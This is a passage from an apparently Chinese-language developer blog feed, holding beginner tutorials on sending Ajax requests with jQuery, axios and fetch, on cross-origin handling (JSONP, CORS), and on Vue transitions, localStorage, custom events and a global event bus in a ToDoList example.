$.post(&#x27;http://localhost:8000/jQuery-server&#x27;,&#123;a:100&#125;,function(data)&#123;</span><br><span class="line">                console.log(data);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;) </span><br></pre></td></tr></table></figure><p>和get()类似，也是四个参数</p><h3 id="方式3-ajax"><a href="#方式3-ajax" class="headerlink" title="方式3 $.ajax()"></a>方式3 $.ajax()</h3><p>这个使用与前面两个相比要复杂一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;button&#x27;).eq(2).click(function()&#123;</span><br><span class="line">           $.ajax(&#123;</span><br><span class="line">               //url地址</span><br><span class="line">               url:&#x27;http://localhost:8000/jQuery-server&#x27;,</span><br><span class="line">               //传入的参数</span><br><span class="line">               data:&#123;a:100,b:200&#125;,</span><br><span class="line">               //请求类型</span><br><span class="line">               type:&#x27;GET&#x27;,</span><br><span class="line">               //返回数据类型</span><br><span class="line">               dataType:&#x27;json&#x27;,</span><br><span class="line">               //成功的回调</span><br><span class="line">               success:function(data)&#123;</span><br><span class="line">                   console.log(data);</span><br><span class="line">               &#125;,</span><br><span class="line">               //时间限制</span><br><span class="line">               timeout:2000,</span><br><span class="line">               //失败回调</span><br><span class="line">               error:function()&#123;</span><br><span class="line">                   console.log(&quot;出错了&quot;);</span><br><span class="line">               &#125;,</span><br><span class="line">               //自定义头信息</span><br><span class="line">            //    headers:&#123;</span><br><span class="line">            //    &#125;</span><br><span class="line">           &#125;)</span><br><span class="line">        &#125;) </span><br></pre></td></tr></table></figure><p>需要配置的参数都以对象的形式写了出来，这里是一些常用的参数，还有一些其他的参数，可以在jQuery官网上参看。</p><h2 id="5-promise中的Ajax"><a href="#5-promise中的Ajax" class="headerlink" title="5.promise中的Ajax"></a>5.promise中的Ajax</h2><p>首先我们引入<code>axios</code>:</p><p>1.我们在GitHub上面引入 –》<a href="https://github.com/axios/axios">https://github.com/axios/axios</a></p><p>2.如果觉得GitHub太慢，我们可以在bootcdn上引入 –》<a href="https://www.bootcdn.cn/axios/">https://www.bootcdn.cn/axios/</a></p><p>在我们的代码中引入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script crossorigin=&quot;anonymous&quot; src=&quot;https://cdn.bootcdn.net/ajax/libs/axios/0.26.1/axios.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>crossorigin=&quot;anonymous&quot;</code>是为了防止跨源报错，<strong>开启允许跨域访问</strong></p><h3 id="方式1-axios-get"><a href="#方式1-axios-get" class="headerlink" title="方式1 axios.get()"></a>方式1 axios.get()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">btns[0].onclick = function () &#123;</span><br><span class="line">            axios.get(&#x27;/axios-server&#x27;, &#123;</span><br><span class="line">                //url参数</span><br><span class="line">                params: &#123;</span><br><span class="line">                    a: 100,</span><br><span class="line">                    b: 200</span><br><span class="line">                &#125;,</span><br><span class="line">                //请求头信息</span><br><span class="line">                headers: &#123;</span><br><span class="line">                    name: &quot;lol&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;).then(value =&gt; &#123;</span><br><span class="line">                console.log(value);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>因为axios基于promise，所以这里是通过promise的方法then()，产生回调。</p><h3 id="方式2-axios-post"><a href="#方式2-axios-post" class="headerlink" title="方式2 axios.post()"></a>方式2 axios.post()</h3><p>post多出一个请求体内容：需要写在第二个参数，其他配置就挪到了第三个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">btns[1].onclick = function () &#123;</span><br><span class="line">            axios.post(&#x27;/axios-server&#x27;, &#123;//第二个参数是请求体              </span><br><span class="line">                    username:&#x27;admin&#x27;,</span><br><span class="line">                    password:&#x27;admin&#x27;</span><br><span class="line">                &#125;,&#123;//第三个参数，其他数据</span><br><span class="line">                //url参数</span><br><span class="line">                params: &#123;</span><br><span class="line">                    uid: 666,</span><br><span class="line">                    b: 200</span><br><span class="line">                &#125;,</span><br><span class="line">                //请求头信息</span><br><span class="line">                headers: &#123;</span><br><span class="line">                    name: &quot;lol&quot;</span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>然后我们就可以在<code>Request PayLoad</code>中参看我们的请求体了</p><h3 id="方式3-axios通用方法"><a href="#方式3-axios通用方法" class="headerlink" title="方式3 axios通用方法"></a>方式3 axios通用方法</h3><p>我们在开发中还有一种通用的方法发送ajax请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">btns[2].onclick = function () &#123;</span><br><span class="line">           axios(&#123;</span><br><span class="line">               //请求方法</span><br><span class="line">               method: &#x27;POST&#x27;,</span><br><span class="line">               //url</span><br><span class="line">               url:&#x27;/axios-server&#x27;,</span><br><span class="line">               //url参数</span><br><span class="line">               params:&#123;</span><br><span class="line">                   vip:10,</span><br><span class="line">                   level:30</span><br><span class="line">               &#125;,</span><br><span class="line">               //头信息</span><br><span class="line">               headers:&#123;</span><br><span class="line">                   a:100,</span><br><span class="line">                   b:200</span><br><span class="line">               &#125;,</span><br><span class="line">               //请求体参数</span><br><span class="line">               data:&#123;</span><br><span class="line">                   username:&#x27;admin&#x27;,</span><br><span class="line">                   password:&#x27;admin&#x27;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;).then(response=&gt;&#123;//获取响应内容</span><br><span class="line">               console.log(response);</span><br><span class="line">           &#125;)</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>与前面jQuery中的 $.ajax()很类似，我们需要配置的参数写在axios({})中</p><h2 id="6-fetch发送Ajax请求"><a href="#6-fetch发送Ajax请求" class="headerlink" title="6.fetch发送Ajax请求"></a>6.fetch发送Ajax请求</h2><p>fetch是基于promise的全局发送ajax的一个方法（但是实际开发中，我们还是axios用的多一点）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">btn.onclick = function () &#123;</span><br><span class="line">            fetch(&#x27;http://localhost:8000/fetch-server?vip=10&#x27;, &#123;</span><br><span class="line">                //请求方法</span><br><span class="line">                method: &#x27;POST&#x27;,</span><br><span class="line">                //请求头</span><br><span class="line">                headers: &#123;</span><br><span class="line">                    name: &#x27;swpu&#x27;</span><br><span class="line">                &#125;,</span><br><span class="line">                //请求体</span><br><span class="line">                body: &#x27;username=admin &amp; password=admin&#x27;</span><br><span class="line">            &#125;).then(response =&gt; &#123;</span><br><span class="line">                return response.text();//如果是json格式，就response.json()</span><br><span class="line">            &#125;).then(response =&gt; &#123;</span><br><span class="line">                console.log(response);</span><br><span class="line">            &#125;).catch(err=&gt;&#123;</span><br><span class="line">                console.log(err);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="7-跨域"><a href="#7-跨域" class="headerlink" title="7.跨域"></a>7.跨域</h2><h3 id="1-同源策略"><a href="#1-同源策略" class="headerlink" title="1.同源策略"></a>1.同源策略</h3><p>定义：协议，域名，端口号必须完全相同，页面和请求向同一个源请求</p><p>ajax默认遵从同源策略，不是同源策略无法直接发ajax请求</p><p>而如果我们违背了同源策略，那么我们就跨域了（3000端口向8000发请求，http向https发请求）</p><p>满足同源策略：url可以简写=》与页面相同的部分url都可以不写</p><h3 id="2-JSONP"><a href="#2-JSONP" class="headerlink" title="2.JSONP"></a>2.JSONP</h3><p>非官方的跨域解决方法，（也就是靠码农们的聪明才智），只支持get请求，是借助一些可以跨域的html标签（img,link…）实现的</p><p>比如我们的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script crossorigin=&quot;anonymous&quot; src=&quot;https://cdn.bootcdn.net/ajax/libs/axios/0.26.1/axios.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>便是通过scipt标签跨源引入了我们的文件。</p><p>但是对于我们的script标签，如果收到的返回是字符串之类的便会报错，<strong>因为js引擎只能识别js代码，所以我们需要服务端给我们返回js代码。</strong>一般可以返回函数调用，然后交给前端代码进行处理。</p><h3 id="3-CORS"><a href="#3-CORS" class="headerlink" title="3.CORS"></a>3.CORS</h3><p>于是我们迎来了正规的跨域解决方法–CORS，发跨域的问题交给了服务端</p><p>原理是通过设置一个响应头告诉浏览器实现跨域</p><p>这个响应头也就是我们之前使用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);//&#x27;*&#x27;里面可以添加那些网页可以给我发请求，*是全部</span><br></pre></td></tr></table></figure><p>世界线收束！！！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Ajax</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动画与过渡</title>
    <link href="/2022/04/17/%E5%8A%A8%E7%94%BB%E5%92%8C%E8%BF%87%E6%B8%A1/"/>
    <url>/2022/04/17/%E5%8A%A8%E7%94%BB%E5%92%8C%E8%BF%87%E6%B8%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="动画和过渡"><a href="#动画和过渡" class="headerlink" title="动画和过渡"></a>动画和过渡</h1><h2 id="1-一个简单的动画"><a href="#1-一个简单的动画" class="headerlink" title="1.一个简单的动画"></a>1.一个简单的动画</h2><p>我们现在使用<code>vue</code>写一个简单的动画，首先我们需要写出动画的css样式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/* v本来应该是transition的名字，没有默认为v */</span><br><span class="line">.hello-enter-active&#123;</span><br><span class="line">    animation: showh1 0.5s linear;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.hello-leave-active&#123;</span><br><span class="line">    animation: showh1 0.5s linear reverse;</span><br><span class="line">&#125;</span><br><span class="line">//keyframes 是动画帧，代表下面是动画</span><br><span class="line">@keyframes showh1&#123;</span><br><span class="line">    from&#123;</span><br><span class="line">        transform:translateX(-100%);</span><br><span class="line">    &#125;</span><br><span class="line">    to&#123;</span><br><span class="line">        transform: translateX(0px);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>enter 和leave分别是进场和退场动画，退场动画使用了reverse也就是进场动画的倒放，linear表示匀速播放。</p><p>接下来我们用一个新标签<code>&lt;transition&gt;</code>，这个标签用于包裹我们要添加动画的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition name=&quot;hello&quot; :appear=true&gt;&lt;!-- 直接写appear也可以 --&gt;</span><br><span class="line">        &lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure><p>这个name属性便是上面.hello-enter和.hello-leave中hello的由来，不写的时候就会默认.v-enter，:appear实现刷新的时候也能加载动画</p><p>需要注意一下我们这里的动画是在<code>isShow</code>属性改变之后触发的，<strong>也就是<code>isShow</code>改变为false之后不会立即消失，而是执行完动画之后再消失。</strong></p><h2 id="2-一个简单的过渡"><a href="#2-一个简单的过渡" class="headerlink" title="2.一个简单的过渡"></a>2.一个简单的过渡</h2><p>我们现在使用过渡完成上面动画的效果</p><p>主要是css部分的改变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.hello-enter-active,.hello-enter-active&#123;</span><br><span class="line"> animation: 0.5s linear;</span><br><span class="line">&#125;</span><br><span class="line">/* 进入的起点和离开的终点 */</span><br><span class="line">.hello-enter,.hello-leave-to&#123;</span><br><span class="line">    transform:translateX(-100%) ;</span><br><span class="line">&#125;</span><br><span class="line">/* 进入的终点和离开的起点 */</span><br><span class="line">.hello-enter-to,.hello-leave&#123;</span><br><span class="line">    transform: translateX(0px);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们不使用动画帧就，通过加入 进入和离开的终点和起点实现效果</p><h2 id="3-多个元素的过渡"><a href="#3-多个元素的过渡" class="headerlink" title="3.多个元素的过渡"></a>3.多个元素的过渡</h2><p>当我们的多个元素都需要过渡的时候，我们就需要在这些元素外面换一个包裹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition-group name=&quot;hello&quot; :appear=true&gt;&lt;!-- 直接写appear也可以 --&gt;</span><br><span class="line">        &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;</span><br><span class="line">        &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;World&lt;/h1&gt;</span><br><span class="line">&lt;/transition-group&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;transition-group&gt;</code>就帮助我们实现了多个元素的过渡，需要注意的是，因为我们group中的是一个list，<strong>我们要在每个元素里面加<code>key</code>值</strong></p><h2 id="4-集成第三方的动画库"><a href="#4-集成第三方的动画库" class="headerlink" title="4.集成第三方的动画库"></a>4.集成第三方的动画库</h2><p>在实现我们动画的时候，我们可以导入第三方的库帮助我们开发，这里我们使用<code>npm</code>上面的animate库</p><p>这里是链接 &lt;<a href="https://animate.style/">Animate.css | A cross-browser library of CSS animations.</a>&gt;</p><p>首先安装这个库：在控制台输入<code>npm install animate.css</code></p><p>引入这个库：<code>import &quot;animate.css&quot;; //因为是一个库，直接引用就好了</code></p><p>接下来我们就上代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition-group </span><br><span class="line">    name=&quot;animate__animated animate__bounce&quot; //把name或者class里面的名字改成这个</span><br><span class="line">    :appear=&quot;true&quot;</span><br><span class="line">    enter-active-class=&quot;animate__bounceInDown&quot;//这里设置进场动画</span><br><span class="line">    leave-active-class=&quot;animate__bounceOutRight&quot;//这里设置离场动画</span><br><span class="line">    &gt;&lt;!-- 直接写appear也可以 --&gt;</span><br><span class="line">      &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;</span><br><span class="line">      &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;World&lt;/h1&gt;</span><br><span class="line">&lt;/transition-group&gt;</span><br></pre></td></tr></table></figure><p>这样我们就通过第三方库给我们提供的样式实现了高大上的动画！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://s2.loli.net/2022/04/17/UAKO7egBZRGyQVq.png" alt="总结1.png"></p><p>我们动画的实现过程其实是一个透明度改变的过程，透明度由0变到1,0便是我们的v-enter,而1就是我们的v-enter-to，也就是enter的结束。中间的过程便是我们的v-enter-active，同样，v-leave也是一样的道理。</p><p><img src="https://s2.loli.net/2022/04/17/CdlhNUvEJzPnoSm.png" alt="总结2.png"></p><p>这里我们需要注意的是，我们在写动画的时候只用到了我们的v-enter-active。但是我们写过渡的时候便是三个部分一起写，体现了过渡的整体性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>todolist案例拓展</title>
    <link href="/2022/04/10/ToDoList%E6%A1%88%E4%BE%8B%E6%8B%93%E5%B1%95/"/>
    <url>/2022/04/10/ToDoList%E6%A1%88%E4%BE%8B%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="ToDoList案例拓展"><a href="#ToDoList案例拓展" class="headerlink" title="ToDoList案例拓展"></a>ToDoList案例拓展</h1><h2 id="一-添加localstorage"><a href="#一-添加localstorage" class="headerlink" title="一.添加localstorage"></a>一.添加localstorage</h2><p>localstorage是我们学习的用于在浏览器上永久储存数据的一个方法，他有六个常用API</p><p>setItem，getItem ，key，removeItem，length，clear</p><p>我们添加本地存储的时候需要用到监视属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">    todos: &#123;</span><br><span class="line">      deep: true, //需要监视todos数组的详细属性，需要打开深度监视</span><br><span class="line">      handler(value) &#123;</span><br><span class="line">        localStorage.setItem(&quot;todos&quot;, JSON.stringify(value)); //存到本地需要使用字符串的形式，通过JSON完成</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>然后是读取问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      todos: JSON.parse(localStorage.getItem(&#x27;todos&#x27;)) || [], //第一次返回null会报错，需要返回一个空数组</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>tips：</p><p>1.第一次写完读取代码之后一直报错，说todos没有定义，结果是getItem里面的todos没有加 ‘ ‘ ，小伙伴们一定注意。</p><p>2.我们发现整个逻辑没有用到removeItem，是因为我们监视的是todos整个数组，<strong>每次改变就会把todos在本地存储中的值替换。</strong></p><h2 id="二-组件自定义事件"><a href="#二-组件自定义事件" class="headerlink" title="二.组件自定义事件"></a>二.组件自定义事件</h2><p>我们子传父的时候也可以通过自定义事件实现</p><p>总的来说，自定义事件就是通过在vc中添加函数，实现了子向父传值。</p><h3 id="1-添加自定义事件"><a href="#1-添加自定义事件" class="headerlink" title="1.添加自定义事件"></a>1.添加自定义事件</h3><p>第一种类型：</p><p>我们先在一个标签下加入一个vc没有的事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;School @swpu=&#x27;getSchoolName&#x27;/&gt;</span><br><span class="line">//对应方法</span><br><span class="line">getSchoolName(name) &#123;</span><br><span class="line">      //通过swpu事件获得了this.name</span><br><span class="line">      console.log(&quot;学校的名字是: &quot;, name);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>然后在该组件下，创造这个事件的触发条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&#x27;sendSchoolName&#x27;&gt;传递学校名字&lt;/button&gt;</span><br><span class="line">//在sendSchoolName的条件下触发事件</span><br><span class="line">methods: &#123;</span><br><span class="line">    sendSchoolName()&#123;</span><br><span class="line">      this.$emit(&#x27;swpu&#x27;,this.name)//替代了props，成为信息传递的媒介</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>$emit函数包括了自定义事件的名字和它所携带的参数，通过这个参数我们就可以实现子向父传参。</p><p>第二种类型：</p><p>我们可以通过ref直接拿到School的原型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;School ref=&quot;school&quot; /&gt;</span><br><span class="line">&lt;!-- 储存School的vc为school --&gt;</span><br></pre></td></tr></table></figure><p>然后就可以在一些情况下自由调用getStudentName方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    this.$refs.school.$on(&quot;swpu&quot;, this.getSchoolName)</span><br><span class="line">    //通过refs拿到School的vc，然后在触发swpu事件的条件下，调用getSchoolName方法,而且可以实现延时发送</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h3 id="2-解绑自定义事件"><a href="#2-解绑自定义事件" class="headerlink" title="2.解绑自定义事件"></a>2.解绑自定义事件</h3><p>我们就用到$off()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">this.$off(&#x27;swpu&#x27;)</span><br><span class="line">this.$off([&#x27;swpu1&#x27;,&#x27;swpu2&#x27;])//解绑多个以数组形式</span><br><span class="line">this.$off()//解绑全部</span><br></pre></td></tr></table></figure><p>或者使用$destory()销毁vc（组件实例对象）也可以实现解绑</p><h3 id="3-自定义事件给data数据传值"><a href="#3-自定义事件给data数据传值" class="headerlink" title="3.自定义事件给data数据传值"></a>3.自定义事件给data数据传值</h3><p>在我们上面的第二种形式下：通过this传值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getSchoolName(name) &#123;</span><br><span class="line">      //通过swpu事件获得了this.name</span><br><span class="line">      console.log(&quot;学校的名字是: &quot;, name);</span><br><span class="line">      this.schoolName = name;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>但是在下面，mounted钩子中需要用到箭头函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.$refs.school.$on(&quot;swpu&quot;, (name) =&gt; &#123;</span><br><span class="line">     //里面的this是触发事件的对象=》student,所以使用箭头函数</span><br><span class="line">     this.schoolName = name;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure><p>因为箭头函数没有自己的this，向外找到了mounted，而像method中的this都是当前组件的vc</p><h3 id="4-修改todolist案例"><a href="#4-修改todolist案例" class="headerlink" title="4.修改todolist案例"></a>4.修改todolist案例</h3><p>于是我们就可以将我们原案例中的子传父，全部改成自定义事件了</p><p>举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//将MyHeader中的receive改成自定义事件</span><br><span class="line">&lt;MyHeader @receive=&quot;receive&quot; /&gt;</span><br><span class="line">//原来有receive的地方就改成</span><br><span class="line">this.$emit(&#x27;receive&#x27;,t)</span><br></pre></td></tr></table></figure><p>十分好用！</p><h2 id="三-全局事件总线"><a href="#三-全局事件总线" class="headerlink" title="三 . 全局事件总线"></a>三 . 全局事件总线</h2><p>帮助我们的组件通信，实现任意组件间的通信，而实现这样的通信的这个线也就是 X ，需要几个特点</p><p><img src="https://s2.loli.net/2022/04/17/rxIdPbR2EcmBO1o.png" alt="全局事件总线.png"></p><p>而我们之前学习vc原型对象的时候说过，vc的原型对象是和vue的原型对象有联系的，也就是我们这个vue原型对象很符合我们 X 的要求。</p><p>所以我们回到main.js 文件</p><h3 id="1-定义事件总线"><a href="#1-定义事件总线" class="headerlink" title="1.定义事件总线"></a>1.定义事件总线</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">    el: &#x27;#app&#x27;,</span><br><span class="line">    render: h =&gt; h(App),</span><br><span class="line">    // 在载入前安装全局事件总线</span><br><span class="line">    beforeCreate() &#123;</span><br><span class="line">        Vue.prototype.$bus=this//这里的this就是new的vue</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后我们在两个组件中使用自定义事件</p><h3 id="2-传输数据："><a href="#2-传输数据：" class="headerlink" title="2.传输数据："></a>2.传输数据：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//一号组件</span><br><span class="line">methods: &#123;</span><br><span class="line">   sendStudentName()&#123;</span><br><span class="line">     this.$bus.$emit(&#x27;hello&#x27;,666)//触发事件，传输数据</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><h3 id="3-接收数据："><a href="#3-接收数据：" class="headerlink" title="3.接收数据："></a>3.接收数据：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//二号组件</span><br><span class="line">mounted() &#123;</span><br><span class="line">    this.$bus.$on(&#x27;hello&#x27;,(x)=&gt;&#123;</span><br><span class="line">      console.log(&quot;我是School收到了 &quot;+x);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>然后在我们使用完这个事件之后最好解绑一下，免得$bus身上的太多了</p><h3 id="4-解绑数据"><a href="#4-解绑数据" class="headerlink" title="4.解绑数据"></a>4.解绑数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 使用完之后销毁,解绑,在school销毁后也销毁hello</span><br><span class="line">  beforeDestroy() &#123;</span><br><span class="line">    this.$bus.$off(&#x27;hello&#x27;)</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h3 id="5-修改todolist案例"><a href="#5-修改todolist案例" class="headerlink" title="5.修改todolist案例"></a>5.修改todolist案例</h3><p>在我们案例中可不是所有的通信都是最好使用全局事件总线，父子通信可以使用props和自定义方法</p><p>在我们的案例中App和MyItem这两个是爷孙关系的组件就很适合我们的$bus</p><p>我们不再需要使用MyList作为中介，所以在删掉相关代码之后</p><p>1.在main.js 中加入事件总线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beforeCreate() &#123;</span><br><span class="line">        Vue.prototype.$bus=this//这里的this就是new的vue</span><br><span class="line">    